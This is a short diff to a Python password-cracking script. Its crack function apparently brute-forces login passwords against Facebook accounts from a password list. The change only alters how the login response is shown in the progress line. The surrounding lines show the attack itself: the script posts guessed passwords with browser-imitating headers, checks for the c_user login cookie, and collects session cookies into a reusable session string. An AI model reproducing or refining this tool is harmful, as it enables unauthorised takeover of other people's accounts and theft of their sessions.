@@ -142,7 +142,7 @@ def crack(uid, password_list, total_count):
                 fail_count = len(cps)
                 percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
             
-            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
+            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}% {response}")
             sys.stdout.flush()
             
             # Create session and generate device hash    re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),   "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}
@@ -212,7 +212,7 @@ def crack(uid, password_list, total_count):
             'viewport-width': '1111',}
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
-            print(respon.text)# Check response
+            response = respon
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
